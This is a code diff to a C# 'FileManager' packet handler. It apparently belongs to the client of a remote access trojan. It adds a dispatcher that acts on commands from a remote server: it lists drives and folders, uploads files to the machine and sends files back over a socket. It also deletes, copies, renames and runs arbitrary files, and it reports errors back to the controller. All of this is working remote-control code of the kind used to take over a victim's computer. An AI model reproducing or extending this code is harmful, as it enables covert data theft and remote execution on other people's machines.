@@ -18,6 +18,128 @@ namespace Client.Handle_Packet
 {
     public class FileManager
     {
+        public FileManager(MsgPack unpack_msgpack)
+        {
+            try
+            {
+                switch (unpack_msgpack.ForcePathObject("Command").AsString)
+                {
+                    case "getDrivers":
+                        {
+                            GetDrivers();
+                            break;
+                        }
+
+                    case "getPath":
+                        {
+                            GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
+                            break;
+                        }
+
+                    case "uploadFile":
+                        {
+                            string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
+                            if (File.Exists(fullPath))
+                            {
+                                File.Delete(fullPath);
+                                Thread.Sleep(500);
+                            }
+                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
+                            break;
+                        }
+
+                    case "reqUploadFile":
+                        {
+                            ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString); ;
+                            break;
+                        }
+
+                    case "socketDownload":
+                        {
+                            DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("DWID").AsString);
+                            break;
+                        }
+
+                    case "deleteFile":
+                        {
+                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                            File.Delete(fullPath);
+                            break;
+                        }
+
+                    case "execute":
+                        {
+                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                            Process.Start(fullPath);
+                            break;
+                        }
+
+                    case "createFolder":
+                        {
+                            string fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
+                            if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
+                            break;
+                        }
+
+                    case "deleteFolder":
+                        {
+                            string fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
+                            if (Directory.Exists(fullPath)) Directory.Delete(fullPath);
+                            break;
+                        }
+
+                    case "copyFile":
+                        {
+                            Packet.FileCopy = unpack_msgpack.ForcePathObject("File").AsString;
+                            break;
+                        }
+
+                    case "pasteFile":
+                        {
+                            string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
+                            if (fullPath.Length > 0)
+                            {
+                                string[] filesArray = Packet.FileCopy.Split(new[] { "-=>" }, StringSplitOptions.None);
+                                for (int i = 0; i < filesArray.Length; i++)
+                                {
+                                    try
+                                    {
+                                        if (filesArray[i].Length > 0)
+                                        {
+                                            File.Copy(filesArray[i], Path.Combine(fullPath, Path.GetFileName(filesArray[i])), true);
+                                        }
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        Error(ex.Message);
+                                    }
+                                }
+                                Packet.FileCopy = null;
+                            }
+                            break;
+                        }
+
+                    case "renameFile":
+                        {
+                            File.Move(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("NewName").AsString);
+                            break;
+                        }
+
+                    case "renameFolder":
+                        {
+                            Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString, unpack_msgpack.ForcePathObject("NewName").AsString);
+                            break; ;
+                        }
+                }
+
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+                Error(ex.Message);
+            }
+        }
+
         public void GetDrivers()
         {
             try
@@ -74,7 +196,7 @@ namespace Client.Handle_Packet
             catch (Exception ex)
             {
                 Debug.WriteLine(ex.Message);
-                Packet.Error(ex.Message);
+                Error(ex.Message);
             }
         }
 
@@ -103,10 +225,10 @@ namespace Client.Handle_Packet
 
         public void DownnloadFile(string file, string dwid)
         {
+            TempSocket tempSocket = new TempSocket();
+
             try
             {
-                TempSocket tempSocket = new TempSocket();
-
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "socketDownload";
                 msgpack.ForcePathObject("Command").AsString = "pre";
@@ -127,6 +249,7 @@ namespace Client.Handle_Packet
             }
             catch
             {
+                tempSocket?.Dispose();
                 return;
             }
         }
@@ -172,6 +295,15 @@ namespace Client.Handle_Packet
                 tempSocket.Send(msgpack.Encode2Bytes());
             }
             catch { return; }
+        }
+
+        public void Error(string ex)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "fileManager";
+            msgpack.ForcePathObject("Command").AsString = "error";
+            msgpack.ForcePathObject("Message").AsString = ex;
+            ClientSocket.Send(msgpack.Encode2Bytes());
         }
     }
 }
